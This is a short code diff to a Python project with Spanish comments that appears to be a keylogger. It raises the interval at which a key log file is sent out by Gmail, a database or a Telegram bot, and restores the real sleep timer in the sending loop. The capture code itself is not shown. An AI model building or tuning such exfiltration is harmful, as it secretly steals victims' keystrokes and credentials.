@@ -41,7 +41,7 @@ class Config:
         self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME
                                                 # Nombre y extensión del registro
         # Importante
-        self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
+        self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
         self.MODE = 2     # 0 = Gmail
                           # 1 = DataBase                                            # Solo se puede usar una opción
                           # 2 = TelegramBot
@@ -292,9 +292,9 @@ class Send:
     def Log(self):
         print("[SendLog] Active...")
         while True:
-            print("[SendLog] El tiempo de espera es: " +str(Config().TIMESEND * 60))
-            #time.sleep(Config().TIMESEND * 60)  # Tiempo de espera por minutos
-            time.sleep(10) # Solo antigueeo
+            print("[SendLog] El tiempo de espera es: " +str(Config().TIMESEND )+ "minutos")
+            time.sleep(Config().TIMESEND * 60)  # Tiempo de espera por minutos
+            #time.sleep(10) # Solo antigueeo
             if Functions().VerifyConnection():
                 if Config().MODE == 0:
                     Util().SendGmail()
